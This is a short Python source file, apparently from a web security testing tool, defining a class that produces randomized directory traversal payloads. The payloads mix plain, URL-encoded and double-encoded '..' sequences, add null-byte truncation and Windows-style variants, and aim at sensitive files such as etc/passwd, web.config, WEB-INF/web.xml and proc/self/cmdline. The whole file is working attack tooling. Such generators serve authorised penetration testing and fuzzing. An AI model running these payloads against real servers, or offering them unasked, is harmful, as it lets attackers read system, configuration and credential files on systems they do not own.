import random

class DirectoryTraversalPayloadGenerator:
    """
    Generates various types of Directory Traversal payloads with randomized components.
    """
    @staticmethod
    def _get_random_path_separator() -> str:
        """Returns a random path separator style."""
        return random.choice(["/", "\\", "%2f", "%5c", "%252f", "%255c"]) # / \ URL-encoded / \ double-encoded / \

    @staticmethod
    def _get_random_dot_dot() -> str:
        """Returns a random '..' or '..\' sequence."""
        return random.choice(["..", "..%2f", "..%5c", "%2e%2e", "%2e%2e%2f", "%2e%2e%5c", "....//"])

    @staticmethod
    def _get_random_target_file() -> str:
        """Returns a random sensitive target file."""
        return random.choice([
            "etc/passwd", "windows/win.ini", "boot.ini", "web.config",
            "WEB-INF/web.xml", "proc/self/cmdline", "var/log/apache2/access.log"
        ])

    @staticmethod
    def generate_basic_payload() -> str:
        """Generates a basic ../../etc/passwd style payload."""
        depth = random.randint(3, 10) # Random depth
        return f"{DirectoryTraversalPayloadGenerator._get_random_dot_dot()}{DirectoryTraversalPayloadGenerator._get_random_path_separator()}" * depth + \
               DirectoryTraversalPayloadGenerator._get_random_target_file()

    @staticmethod
    def generate_encoded_payload() -> str:
        """Generates a payload with URL-encoded or double-encoded parts."""
        depth = random.randint(3, 10)
        dot_dot = random.choice(["%2e%2e", "%2e%2e%2f", "%2e%2e%5c", "%252e%252e%252f"]) # More encoded options
        separator = random.choice(["%2f", "%5c", "%252f", "%255c"])
        target = DirectoryTraversalPayloadGenerator._get_random_target_file()
        return f"{dot_dot}{separator}" * depth + target

    @staticmethod
    def generate_null_byte_payload() -> str:
        """Generates a payload with a null byte (%00) for truncation."""
        depth = random.randint(3, 7)
        path = f"{DirectoryTraversalPayloadGenerator._get_random_dot_dot()}{DirectoryTraversalPayloadGenerator._get_random_path_separator()}" * depth + \
               DirectoryTraversalPayloadGenerator._get_random_target_file()
        return f"{path}%00random_suffix.jpg" # Append null byte to truncate

    @staticmethod
    def generate_windows_payload() -> str:
        """Generates a Windows-style path traversal payload."""
        depth = random.randint(3, 10)
        dot_dot = random.choice(["..", "..\\", "..%5c"])
        target = random.choice(["windows\\win.ini", "boot.ini", "inetpub\\wwwroot\\web.config"])
        return f"{dot_dot}\\" * depth + target

    @staticmethod
    def get_random_dt_payload() -> str:
        """Returns a random Directory Traversal payload by choosing from different generation types."""
        generator_functions = [
            DirectoryTraversalPayloadGenerator.generate_basic_payload,
            DirectoryTraversalPayloadGenerator.generate_encoded_payload,
            DirectoryTraversalPayloadGenerator.generate_null_byte_payload,
            DirectoryTraversalPayloadGenerator.generate_windows_payload,
        ]
        chosen_generator = random.choice(generator_functions)
        return chosen_generator()

